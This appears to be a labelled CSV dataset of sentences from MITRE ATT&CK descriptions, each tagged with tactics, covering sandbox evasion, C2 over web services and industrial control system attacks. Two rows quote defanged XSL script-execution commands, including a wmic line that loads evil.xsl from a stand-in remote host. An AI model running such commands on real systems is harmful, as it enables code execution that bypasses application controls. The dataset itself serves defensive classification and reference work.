MITRE Descriptions,Tactic1,Tactic2,Tactic3,Tactic4
"Adversaries may use several methods to accomplish [Virtualization/Sandbox Evasion] such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization.",DEFENSE_EVASION,DISCOVERY,,
Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment.,DEFENSE_EVASION,DISCOVERY,,
Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.,DEFENSE_EVASION,DISCOVERY,,
Adversaries may employ various system checks to detect and avoid virtualization and analysis environments.,DEFENSE_EVASION,DISCOVERY,,
"Specific checks will vary based on the target and/or adversary, but may involve behaviors such as [Windows Management Instrumentation], [PowerShell], [System Information Discovery], and [Query Registry] to obtain system information and search for VME artifacts.",DEFENSE_EVASION,DISCOVERY,,
"Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry.",DEFENSE_EVASION,DISCOVERY,,
Adversaries may use scripting to automate these checks into one script and then have the program exit if it determines the system to be a virtual environment.,DEFENSE_EVASION,DISCOVERY,,
Checks could include generic system properties such as host/domain name and samples of network traffic.,DEFENSE_EVASION,DISCOVERY,,
"Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size.",DEFENSE_EVASION,DISCOVERY,,
"Other common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions.",DEFENSE_EVASION,DISCOVERY,,
"In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output.",DEFENSE_EVASION,DISCOVERY,,
"Hardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment.",DEFENSE_EVASION,DISCOVERY,,
Adversaries may also query for specific readings from these devices.,DEFENSE_EVASION,DISCOVERY,,
Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments.,DEFENSE_EVASION,DISCOVERY,,
"This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.",DEFENSE_EVASION,DISCOVERY,,
"Adversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: [Scheduled Task/Job]).",DEFENSE_EVASION,DISCOVERY,,
"Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled [Multi-Stage Channels] to avoid analysis and scrutiny.",DEFENSE_EVASION,DISCOVERY,,
Benign commands or other operations may also be used to delay malware execution.,DEFENSE_EVASION,DISCOVERY,,
"Loops or otherwise needless repetitions of commands, such as [Ping]s, may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments.",DEFENSE_EVASION,DISCOVERY,,
"Adversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time.",DEFENSE_EVASION,DISCOVERY,,
"For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.",DEFENSE_EVASION,DISCOVERY,,
Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments.,DEFENSE_EVASION,DISCOVERY,,
Adversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks.,DEFENSE_EVASION,DISCOVERY,,
Adversaries may compromise a network device’s encryption capability in order to bypass encryption that would otherwise protect data communications.,DEFENSE_EVASION,,,
Encryption can be used to protect transmitted network traffic to maintain its confidentiality (protect against unauthorized disclosure) and integrity (protect against unauthorized changes).,DEFENSE_EVASION,,,
Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key.,DEFENSE_EVASION,,,
"Typically, longer keys increase the cost of cryptanalysis, or decryption without the key.",DEFENSE_EVASION,,,
Adversaries can compromise and manipulate devices that perform encryption of network traffic.,DEFENSE_EVASION,,,
"For example, through behaviors such as [Modify System Image], [Reduce Key Space], and [Disable Crypto Hardware], an adversary can negatively effect and/or eliminate a device’s ability to securely encrypt network traffic.",DEFENSE_EVASION,,,
"This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts.",DEFENSE_EVASION,,,
"Adversaries disable a network device’s dedicated hardware encryption, which may enable them to leverage weaknesses in software encryption in order to reduce the effort involved in collecting, manipulating, and exfiltrating transmitted data.",DEFENSE_EVASION,,,
"Many network devices such as routers, switches, and firewalls, perform encryption on network traffic to secure transmission across networks.",DEFENSE_EVASION,,,
"Often, these devices are equipped with special, dedicated encryption hardware to greatly increase the speed of the encryption process as well as to prevent malicious tampering.",DEFENSE_EVASION,,,
"When an adversary takes control of such a device, they may disable the dedicated hardware, for example, through use of [Modify System Image], forcing the use of software to perform encryption on general processors.",DEFENSE_EVASION,,,
"This is typically used in conjunction with attacks to weaken the strength of the cipher in software (e.g., [Reduce Key Space]).",DEFENSE_EVASION,,,
Adversaries may reduce the level of effort required to decrypt data transmitted over the network by reducing the cipher strength of encrypted communications.,DEFENSE_EVASION,,,
"Adversaries can weaken the encryption software on a compromised network device by reducing the key size used by the software to convert plaintext to ciphertext (e.g., from hundreds or thousands of bytes to just a couple of bytes).",DEFENSE_EVASION,,,
"As a result, adversaries dramatically reduce the amount of effort needed to decrypt the protected information without the key.",DEFENSE_EVASION,,,
Adversaries may modify the key size used and other encryption parameters using specialized commands in a [Network Device CLI] introduced to the system through [Modify System Image] to change the configuration of the device.,DEFENSE_EVASION,,,
"Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system.",COMMAND_AND_CONTROL,,,
Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise.,COMMAND_AND_CONTROL,,,
"Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise.",COMMAND_AND_CONTROL,,,
"Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.",COMMAND_AND_CONTROL,,,
Use of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).,COMMAND_AND_CONTROL,,,
"Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel.",COMMAND_AND_CONTROL,,,
Compromised systems may leverage popular websites and social media to host command and control (C2) instructions.,COMMAND_AND_CONTROL,,,
Those infected systems can then send the output from those commands back over that Web service channel.,COMMAND_AND_CONTROL,,,
"The return traffic may occur in a variety of ways, depending on the Web service being utilized.",COMMAND_AND_CONTROL,,,
"For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet.",COMMAND_AND_CONTROL,,,
"Adversaries may use an existing, legitimate external Web service to host information that points to additional command and control (C2) infrastructure.",COMMAND_AND_CONTROL,,,
"Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses.",COMMAND_AND_CONTROL,,,
"Once infected, victims will reach out to and be redirected by these resolvers.",COMMAND_AND_CONTROL,,,
Use of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).,COMMAND_AND_CONTROL,,,
"Adversaries may use an existing, legitimate external Web service as a means for sending commands to a compromised system without receiving return output over the Web service channel.",COMMAND_AND_CONTROL,,,
"Those infected systems may opt to send the output from those commands back over a different C2 channel, including to another distinct Web service.",COMMAND_AND_CONTROL,,,
"Alternatively, compromised systems may return no output at all in cases where adversaries want to send instructions to systems and do not want a response.",COMMAND_AND_CONTROL,,,
WMI is an administration feature that provides a uniform environment to access Windows system components.,EXECUTION,,,
"The WMI service enables both local and remote access, though the latter is facilitated by [Remote Services] such as [Distributed Component Object Model] (DCOM) and [Windows Remote Management] (WinRM).",EXECUTION,,,
"An adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for Discovery as well as remote Execution of files as part of Lateral Movement.",EXECUTION,,,
Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files.,DEFENSE_EVASION,,,
"To support complex operations, the XSL standard includes support for embedded scripting in various languages.",DEFENSE_EVASION,,,
Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control.,DEFENSE_EVASION,,,
"Similar to [Trusted Developer Utilities Proxy Execution], the Microsoft common line transformation utility binary (msxsl.exe).",DEFENSE_EVASION,,,
"Command-line examples:



* msxsl.exe customers[.]xml script[.]xsl

* msxsl.exe script[.]xsl script[.]xsl

* msxsl.exe script[.]jpeg script[.]jpeg.",DEFENSE_EVASION,,,
"Another variation of this technique, dubbed “Squiblytwo”, involves using [Windows Management Instrumentation] to invoke JScript or VBScript within an XSL file.",DEFENSE_EVASION,,,
"Command-line examples:



* Local File: wmic process list /FORMAT:evil[.]xsl

* Remote File: wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”.",DEFENSE_EVASION,,,
Adversaries with privileged network access may seek to modify network traffic in real time using adversary-in-the-middle (AiTM) attacks.,COLLECTION,,,
"An AiTM attack may allow an adversary to perform the following attacks: [Block Reporting Message], [Spoof Reporting Message], [Modify Parameter], [Unauthorized Command Message].",COLLECTION,,,
Adversaries may automate collection of industrial environment information using tools or scripts.,COLLECTION,,,
This automated collection may leverage native control protocols and tools available in the control systems environment.,COLLECTION,,,
"For example, the OPC protocol may be used to enumerate and gather information.",COLLECTION,,,
"Access to a system or interface with these native protocols may allow collection and enumeration of other attached, communicating servers and devices.",COLLECTION,,,
Adversaries may change the operating mode of a controller to gain additional access to engineering functions such as Program Download.,EXECUTION,,,
Programmable controllers typically have several modes of operation that control the state of the user program and control access to the controllers API.,EXECUTION,,,
Operating modes can be physically selected using a key switch on the face of the controller but may also be selected with calls to the controllers API.,EXECUTION,,,
Operating modes and the mechanisms by which they are selected often vary by vendor and product line.,EXECUTION,,,
Some commonly implemented operating modes are described below: * Program - This mode must be enabled before changes can be made to a devices program.,EXECUTION,,,
This allows program uploads and downloads between the device and an engineering workstation.,EXECUTION,,,
"Often the PLCs logic Is halted, and all outputs may be forced off. * Run - Execution of the devices program occurs in this mode.",EXECUTION,,,
"Input and output (values, points, tags, elements, etc.) are monitored and used according to the programs logic. [Program Upload] and [Program Download] are disabled while in this mode. * Remote - Allows for remote changes to a PLCs operation mode. * Stop - The PLC and program is stopped, while in this mode, outputs are forced off. * Reset - Conditions on the PLC are reset to their original states.",EXECUTION,,,
"Warm resets may retain some memory while cold resets will reset all I/O and data registers. * Test / Monitor mode - Similar to run mode, I/O is processed, although this mode allows for monitoring, force set, resets, and more generally tuning or debugging of the system.",EXECUTION,,,
Often monitor mode may be used as a trial for initialization.,EXECUTION,,,
Adversaries may utilize command-line interfaces (CLIs) to interact with systems and execute commands.,EXECUTION,,,
CLIs provide a means of interacting with computer systems and are a common feature across many types of platforms and devices within control systems environments.,EXECUTION,,,
"Adversaries may also use CLIs to install and run new software, including malicious tools that may be installed over the course of an operation.",EXECUTION,,,
"CLIs are typically accessed locally, but can also be exposed via services, such as SSH, Telnet, and RDP.",EXECUTION,,,
"Commands that are executed in the CLI execute with the current permissions level of the process running the terminal emulator, unless the command specifies a change in permissions context.",EXECUTION,,,
Many controllers have CLI interfaces for management purposes.,EXECUTION,,,
"Adversaries may communicate over a commonly used port to bypass firewalls or network detection systems and to blend in with normal network activity, to avoid more detailed inspection.",COMMAND_AND_CONTROL,,,
"They may use the protocol associated with the port, or a completely different protocol.",COMMAND_AND_CONTROL,,,
"They may use commonly open ports, such as the examples provided below. 
 
 * TCP:80 (HTTP) 
 * TCP:443 (HTTPS) 
 * TCP/UDP:53 (DNS) 
 * TCP:1024-4999 (OPC on XP/Win2k3) 
 * TCP:49152-65535 (OPC on Vista and later) 
 * TCP:23 (TELNET) 
 * UDP:161 (SNMP) 
 * TCP:502 (MODBUS) 
 * TCP:102 (S7comm/ISO-TSAP) 
 * TCP:20000 (DNP3) 
 * TCP:44818 (Ethernet/IP).",COMMAND_AND_CONTROL,,,
Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications.,COMMAND_AND_CONTROL,,,
"The definition of a proxy can also be expanded to encompass trust relationships between networks in peer-to-peer, mesh, or trusted connections between networks consisting of hosts or systems that regularly communicate with each other.",COMMAND_AND_CONTROL,,,
The network may be within a single organization or across multiple organizations with trust relationships.,COMMAND_AND_CONTROL,,,
"Adversaries could use these types of relationships to manage command and control communications, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion.",COMMAND_AND_CONTROL,,,
"Adversaries may cause damage and destruction of property to infrastructure, equipment, and the surrounding environment when attacking control systems.",IMPACT,,,
"This technique may result in device and operational equipment breakdown, or represent tangential damage from other techniques used in an attack.",IMPACT,,,
"Depending on the severity of physical damage and disruption caused to control processes and systems, this technique may result in [Loss of Safety].",IMPACT,,,
"Operations that result in [Loss of Control] may also cause damage to property, which may be directly or indirectly motivated by an adversary seeking to cause impact in the form of [Loss of Productivity and Revenue].",IMPACT,,,
"In the Maroochy Shire attack, the adversary gained remote computer access to the control system and altered data so that whatever function should have occurred at affected pumping stations did not occur or occurred in a different way.",IMPACT,,,
"This ultimately led to 800,000 liters of raw sewage being spilled out into the community.",IMPACT,,,
"The raw sewage affected local parks, rivers, and even a local hotel.",IMPACT,,,
This resulted in harm to marine life and produced a sickening stench from the community's now blackened rivers.,IMPACT,,,
The German Federal Office for Information Security (BSI) reported a targeted attack on a steel mill under an incidents affecting business section of its 2014 IT Security Report.,IMPACT,,,
These targeted attacks affected industrial operations and resulted in breakdowns of control system components and even entire installations.,IMPACT,,,
"As a result of these breakdowns, massive impact and damage resulted from the uncontrolled shutdown of a blast furnace.",IMPACT,,,
A Polish student used a remote controller device to interface with the Lodz city tram system in Poland.,IMPACT,,,
Adversaries may target and collect data from information repositories.,COLLECTION,,,
"This can include sensitive data such as specifications, schematics, or diagrams of control system layouts, devices, and processes.",COLLECTION,,,
"Examples of information repositories include reference databases or local machines in the process environment, as well as workstations and databases in the corporate network that might contain information about the ICS.",COLLECTION,,,
"Information collected from these systems may provide the adversary with a better understanding of the operational environment, vendors used, processes, or procedures of the ICS.",COLLECTION,,,
"In a campaign between 2011 and 2013 against ONG organizations, Chinese state-sponsored actors searched document repositories for specific information such as, system manuals, remote terminal unit (RTU) sites, personnel lists, documents that included the string SCAD*, user credentials, and remote dial-up access information.",COLLECTION,,,
Adversaries may leverage manufacturer or supplier set default credentials on control system devices.,LATERAL_MOVEMENT,,,
These default credentials may have administrative permissions and may be necessary for initial configuration of the device.,LATERAL_MOVEMENT,,,
"It is general best practice to change the passwords for these accounts as soon as possible, but some manufacturers may have devices that have passwords or usernames that cannot be changed.",LATERAL_MOVEMENT,,,
"Default credentials are normally documented in an instruction manual that is either packaged with the device, published online through official means, or published online through unofficial means.",LATERAL_MOVEMENT,,,
Adversaries may leverage default credentials that have not been properly modified or disabled.,LATERAL_MOVEMENT,,,
Adversaries may cause a denial of control to temporarily prevent operators and engineers from interacting with process controls.,IMPACT,,,
An adversary may attempt to deny process control access to cause a temporary loss of communication with the control device or to prevent operator adjustment of process controls.,IMPACT,,,
"An affected process may still be operating during the period of control loss, but not necessarily in a desired state.",IMPACT,,,
"In the Maroochy Shire attack, the adversary temporarily shut an investigator out of the network preventing them from issuing any controls.",IMPACT,,,
In the 2017 Dallas Siren incident operators were unable to disable the false alarms from the Office of Emergency Management headquarters.,IMPACT,,,
Adversaries may cause a denial of view in attempt to disrupt and prevent operator oversight on the status of an ICS environment.,IMPACT,,,
"This may manifest itself as a temporary communication failure between a device and its control source, where the interface recovers and becomes available once the interference ceases.",IMPACT,,,
An adversary may attempt to deny operator visibility by preventing them from receiving status and reporting messages.,IMPACT,,,
Denying this view may temporarily block and prevent operators from noticing a change in state or anomalous behavior.,IMPACT,,,
"The environment's data and processes may still be operational, but functioning in an unintended or adversarial manner.",IMPACT,,,
"In the Maroochy Shire attack, the adversary temporarily shut an investigator out of the network, preventing them from viewing the state of the system.",IMPACT,,,
Adversaries may gather information about a PLCs or controllers current operating mode.,COLLECTION,,,
"Operating modes dictate what change or maintenance functions can be manipulated and are often controlled by a key switch on the PLC (e.g., run, prog [program], and remote).",COLLECTION,,,
Knowledge of these states may be valuable to an adversary to determine if they are able to reprogram the PLC.,COLLECTION,,,
Operating modes and the mechanisms by which they are selected often vary by vendor and product line.,COLLECTION,,,
Some commonly implemented operating modes are described below: * Program - This mode must be enabled before changes can be made to a devices program.,COLLECTION,,,
This allows program uploads and downloads between the device and an engineering workstation.,COLLECTION,,,
"Often the PLCs logic Is halted, and all outputs may be forced off. * Run - Execution of the devices program occurs in this mode.",COLLECTION,,,
"Input and output (values, points, tags, elements, etc.) are monitored and used according to the programs logic. [Program Upload] and [Program Download] are disabled while in this mode. * Remote - Allows for remote changes to a PLCs operation mode. * Stop - The PLC and program is stopped, while in this mode, outputs are forced off. * Reset - Conditions on the PLC are reset to their original states.",COLLECTION,,,
"Warm resets may retain some memory while cold resets will reset all I/O and data registers. * Test / Monitor mode - Similar to run mode, I/O is processed, although this mode allows for monitoring, force set, resets, and more generally tuning or debugging of the system.",COLLECTION,,,
Often monitor mode may be used as a trial for initialization.,COLLECTION,,,
"Adversaries may gain access to a system during a drive-by compromise, when a user visits a website as part of a regular browsing session.",INITIAL_ACCESS,,,
"With this technique, the user's web browser is targeted and exploited simply by visiting the compromised website.",INITIAL_ACCESS,,,
"The adversary may target a specific community, such as trusted third party suppliers or other industry specific groups, which often visit the target website.",INITIAL_ACCESS,,,
"This kind of targeted attack relies on a common interest, and is known as a strategic web compromise or watering hole attack.",INITIAL_ACCESS,,,
The National Cyber Awareness System (NCAS) has issued a Technical Alert (TA) regarding Russian government cyber activity targeting critical infrastructure sectors.,INITIAL_ACCESS,,,
Analysis by DHS and FBI has noted two distinct categories of victims in the Dragonfly campaign on the Western energy sector: staging and intended targets.,INITIAL_ACCESS,,,
"The adversary targeted the less secure networks of staging targets, including trusted third-party suppliers and related peripheral organizations.",INITIAL_ACCESS,,,
"Initial access to the intended targets used watering hole attacks to target process control, ICS, and critical infrastructure related trade publications and informational websites.",INITIAL_ACCESS,,,
Adversaries may attempt to leverage Application Program Interfaces (APIs) used for communication between control software and the hardware.,EXECUTION,,,
Specific functionality is often coded into APIs which can be called by software to engage specific functions on a device or other software.,EXECUTION,,,
Adversaries may leverage weaknesses to exploit internet-facing software for initial access into an industrial network.,INITIAL_ACCESS,,,
"Internet-facing software may be user applications, underlying networking implementations, an assets operating system, weak defenses, etc.",INITIAL_ACCESS,,,
Targets of this technique may be intentionally exposed for the purpose of remote management and visibility.,INITIAL_ACCESS,,,
An adversary may seek to target public-facing applications as they may provide direct access into an ICS environment or the ability to move into the ICS network.,INITIAL_ACCESS,,,
Publicly exposed applications may be found through online tools that scan the internet for open ports and services.,INITIAL_ACCESS,,,
Version numbers for the exposed application may provide adversaries an ability to target specific known vulnerabilities.,INITIAL_ACCESS,,,
Exposed control protocol or remote access ports found in Commonly Used Port may be of interest by adversaries.,INITIAL_ACCESS,,,
"Adversaries may exploit a software vulnerability to take advantage of a programming error in a program, service, or within the operating system software or kernel itself to enable remote service abuse.",INITIAL_ACCESS,LATERAL_MOVEMENT,,
A common goal for post-compromise exploitation of remote services is for initial access into and lateral movement throughout the ICS environment to enable access to targeted systems.,INITIAL_ACCESS,LATERAL_MOVEMENT,,
"ICS asset owners and operators have been affected by ransomware (or disruptive malware masquerading as ransomware) migrating from enterprise IT to ICS environments: WannaCry, NotPetya, and BadRabbit.",INITIAL_ACCESS,LATERAL_MOVEMENT,,
"In each of these cases, self-propagating (wormable) malware initially infected IT networks, but through exploit (particularly the SMBv1-targeting MS17-010 vulnerability) spread to industrial networks, producing significant impacts.",INITIAL_ACCESS,LATERAL_MOVEMENT,,
Adversaries may leverage external remote services as a point of initial access into your network.,INITIAL_ACCESS,,,
These services allow users to connect to internal network resources from external locations.,INITIAL_ACCESS,,,
"Examples are VPNs, Citrix, and other access mechanisms.",INITIAL_ACCESS,,,
Remote service gateways often manage connections and credential authentication for these services.,INITIAL_ACCESS,,,
External remote services allow administration of a control system from outside the system.,INITIAL_ACCESS,,,
"Often, vendors and internal engineering groups have access to external remote services to control system networks via the corporate network.",INITIAL_ACCESS,,,
"In some cases, this access is enabled directly from the internet.",INITIAL_ACCESS,,,
"While remote access enables ease of maintenance when a control system is in a remote area, compromise of remote access solutions is a liability.",INITIAL_ACCESS,,,
The adversary may use these services to gain access to and execute attacks against a control system network.,INITIAL_ACCESS,,,
Access to valid accounts is often a requirement.,INITIAL_ACCESS,,,
"As they look for an entry point into the control system network, adversaries may begin searching for existing point-to-point VPN implementations at trusted third party networks or through remote support employee connections where split tunneling is enabled.",INITIAL_ACCESS,,,
"In the Maroochy Shire attack, the adversary gained remote computer access to the system over radio.",INITIAL_ACCESS,,,
Adversaries may attempt to gain access to a machine via a Graphical User Interface (GUI) to enhance execution capabilities.,EXECUTION,,,
Access to a GUI allows a user to interact with a computer in a more visual manner than a CLI.,EXECUTION,,,
"A GUI allows users to move a cursor and click on interface objects, with a mouse and keyboard as the main input devices, as opposed to just using the keyboard.",EXECUTION,,,
"If physical access is not an option, then access might be possible via protocols such as VNC on Linux-based and Unix-based operating systems, and RDP on Windows operating systems.",EXECUTION,,,
An adversary can use this access to execute programs and applications on the target machine.,EXECUTION,,,
Adversaries may leverage credentials that are hardcoded in software or firmware to gain an unauthorized interactive user session to an asset.,LATERAL_MOVEMENT,PERSISTENCE,,
"Examples credentials that may be hardcoded in an asset include:

* Username/Passwords
* Cryptographic keys/Certificates
* API tokens.",LATERAL_MOVEMENT,PERSISTENCE,,
"Unlike [Default Credentials], these credentials are built into the system in a way that they either cannot be changed by the asset owner, or may be infeasible to change because of the impact it would cause to the control system operation.",LATERAL_MOVEMENT,PERSISTENCE,,
These credentials may be reused across whole product lines or device models and are often not published or known to the owner and operators of the asset.,LATERAL_MOVEMENT,PERSISTENCE,,
Adversaries may utilize these hardcoded credentials to move throughout the control system environment or provide reliable access for their tools to interact with industrial assets.,LATERAL_MOVEMENT,PERSISTENCE,,
Adversaries may hook into application programming interface (API) functions used by processes to redirect calls for execution and privilege escalation means.,EXECUTION,PRIVILEGE_ESCALATION,,
Windows processes often leverage these API functions to perform tasks that require reusable system resources.,EXECUTION,PRIVILEGE_ESCALATION,,
Windows API functions are typically stored in dynamic-link libraries (DLLs) as exported functions.,EXECUTION,PRIVILEGE_ESCALATION,,
One type of hooking seen in ICS involves redirecting calls to these functions via import address table (IAT) hooking.,EXECUTION,PRIVILEGE_ESCALATION,,
"IAT hooking uses modifications to a processs IAT, where pointers to imported API functions are stored.",EXECUTION,PRIVILEGE_ESCALATION,,
Adversaries may seek to capture process values related to the inputs and outputs of a PLC.,COLLECTION,,,
"During the scan cycle, a PLC reads the status of all inputs and stores them in an image table.",COLLECTION,,,
The image table is the PLCs internal storage location where values of inputs/outputs for one scan are stored while it executes the user program.,COLLECTION,,,
"After the PLC has solved the entire logic program, it updates the output image table.",COLLECTION,,,
The contents of this output image table are written to the corresponding output points in I/O Modules.,COLLECTION,,,
The Input and Output Image tables described above make up the I/O Image on a PLC.,COLLECTION,,,
This image is used by the user program instead of directly interacting with physical I/O.,COLLECTION,,,
Adversaries may collect the I/O Image state of a PLC by utilizing a devices [Native API] to access the memory regions directly.,COLLECTION,,,
The collection of the PLCs I/O state could be used to replace values or inform future stages of an attack.,COLLECTION,,,
Adversaries may gain access into industrial environments through systems exposed directly to the internet for remote access rather than through [External Remote Services].,INITIAL_ACCESS,,,
Internet Accessible Devices are exposed to the internet unintentionally or intentionally without adequate protections.,INITIAL_ACCESS,,,
This may allow for adversaries to move directly into the control system network.,INITIAL_ACCESS,,,
"Access onto these devices is accomplished without the use of exploits, these would be represented within the [Exploit Public-Facing Application] technique.",INITIAL_ACCESS,,,
Adversaries may leverage built in functions for remote access which may not be protected or utilize minimal legacy protections that may be targeted.,INITIAL_ACCESS,,,
These services may be discoverable through the use of online scanning tools.,INITIAL_ACCESS,,,
"In the case of the Bowman dam incident, adversaries leveraged access to the dam control network through a cellular modem.",INITIAL_ACCESS,,,
"Access to the device was protected by password authentication, although the application was vulnerable to brute forcing.",INITIAL_ACCESS,,,
"In Trend Micros manufacturing deception operations adversaries were detected leveraging direct internet access to an ICS environment through the exposure of operational protocols such as Siemens S7, Omron FINS, and EtherNet/IP, in addition to misconfigured VNC access.",INITIAL_ACCESS,,,
Adversaries may transfer tools or other files from one system to another to stage adversary tools or other files over the course of an operation.,LATERAL_MOVEMENT,,,
"In control systems environments, malware may use SMB and other file sharing protocols to move laterally through industrial networks.",LATERAL_MOVEMENT,,,
Adversaries may attempt to disrupt essential components or systems to prevent owner and operator from delivering products or services.,IMPACT,,,
"Adversaries may leverage malware to delete or encrypt critical data on HMIs, workstations, or databases.",IMPACT,,,
"In the 2021 Colonial Pipeline ransomware incident, pipeline operations were temporally halted on May 7th and were not fully restarted until May 12th.",IMPACT,,,
Adversaries may seek to achieve a sustained loss of control or a runaway condition in which operators cannot issue any commands even if the malicious interference has subsided.,IMPACT,,,
The German Federal Office for Information Security (BSI) reported a targeted attack on a steel mill in its 2014 IT Security Report.,IMPACT,,,
"As a result of these breakdowns, massive impact resulted in damage and unsafe conditions from the uncontrolled shutdown of a blast furnace.",IMPACT,,,
"Adversaries may cause loss of productivity and revenue through disruption and even damage to the availability and integrity of control system operations, devices, and related processes.",IMPACT,,,
"This technique may manifest as a direct effect of an ICS-targeting attack or tangentially, due to an IT-targeting attack against non-segregated environments.",IMPACT,,,
"In cases where these operations or services are brought to a halt, the loss of productivity may eventually present an impact for the end-users or consumers of products and services.",IMPACT,,,
"The disrupted supply-chain may result in supply shortages and increased prices, among other consequences.",IMPACT,,,
"A ransomware attack on an Australian beverage company resulted in the shutdown of some manufacturing sites, including precautionary halts to protect key systems.",IMPACT,,,
"In the 2021 Colonial Pipeline ransomware incident, the pipeline was unable to transport approximately 2.5 million barrels of fuel per day to the East Coast.",IMPACT,,,
Adversaries may compromise protective system functions designed to prevent the effects of faults and abnormal conditions.,IMPACT,,,
"This can result in equipment damage, prolonged process disruptions and hazards to personnel.",IMPACT,,,
Many faults and abnormal conditions in process control happen too quickly for a human operator to react to.,IMPACT,,,
Speed is critical in correcting these conditions to limit serious impacts such as Loss of Control and Property Damage.,IMPACT,,,
Adversaries may target and disable protective system functions as a prerequisite to subsequent attack execution or to allow for future faults and abnormal conditions to go unchecked.,IMPACT,,,
Detection of a Loss of Protection by operators can result in the shutdown of a process due to strict policies regarding protection systems.,IMPACT,,,
This can cause a Loss of Productivity and Revenue and may meet the technical goals of adversaries seeking to cause process disruptions.,IMPACT,,,
Adversaries may compromise safety system functions designed to maintain safe operation of a process when unacceptable or dangerous conditions occur.,IMPACT,,,
Safety systems are often composed of the same elements as control systems but have the sole purpose of ensuring the process fails in a predetermined safe manner.,IMPACT,,,
Many unsafe conditions in process control happen too quickly for a human operator to react to.,IMPACT,,,
Adversaries may target and disable safety system functions as a prerequisite to subsequent attack execution or to allow for future unsafe conditionals to go unchecked.,IMPACT,,,
Detection of a Loss of Safety by operators can result in the shutdown of a process due to strict policies regarding safety systems.,IMPACT,,,
"Adversaries may cause a sustained or permanent loss of view where the ICS equipment will require local, hands-on operator intervention; for instance, a restart or manual operation.",IMPACT,,,
"By causing a sustained reporting or visibility loss, the adversary can effectively hide the present state of operations.",IMPACT,,,
This loss of view can occur without affecting the physical processes themselves.,IMPACT,,,
Adversaries may manipulate physical process control within the industrial environment.,IMPACT,,,
"Methods of manipulating control can include changes to set point values, tags, or other parameters.",IMPACT,,,
"Adversaries may manipulate control systems devices or possibly leverage their own, to communicate with and command physical control processes.",IMPACT,,,
"The duration of manipulation may be temporary or longer sustained, depending on operator detection.",IMPACT,,,
